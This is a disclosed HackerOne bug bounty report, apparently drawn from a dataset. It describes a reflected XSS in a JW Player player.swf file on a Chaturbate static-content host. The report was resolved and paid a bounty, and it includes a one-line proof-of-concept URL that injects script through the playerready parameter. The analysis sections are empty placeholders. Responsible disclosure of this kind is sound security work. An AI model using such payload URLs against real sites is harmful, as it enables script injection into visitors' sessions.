---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '386340'
original_report_id: '386340'
title: Reflected XSS on ssl-ccstatic.highwebmedia.com  via player.swf
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: chaturbate
created_at: '2018-07-24T18:19:44.100Z'
disclosed_at: '2018-09-19T23:35:21.232Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 7
asset_identifier: '*.highwebmedia.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on ssl-ccstatic.highwebmedia.com  via player.swf

## Metadata

- HackerOne Report ID: 386340
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: chaturbate
- Disclosed At: 2018-09-19T23:35:21.232Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey there,

There's a SWF based XSS on ssl-ccstatic.highwebmedia.com. You may want to update/remove the file.


#POC
https://ssl-ccstatic.highwebmedia.com/jwplayer/player.swf?playerready=alert(document.domain)

Thanks,
Ben

## Impact

#

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
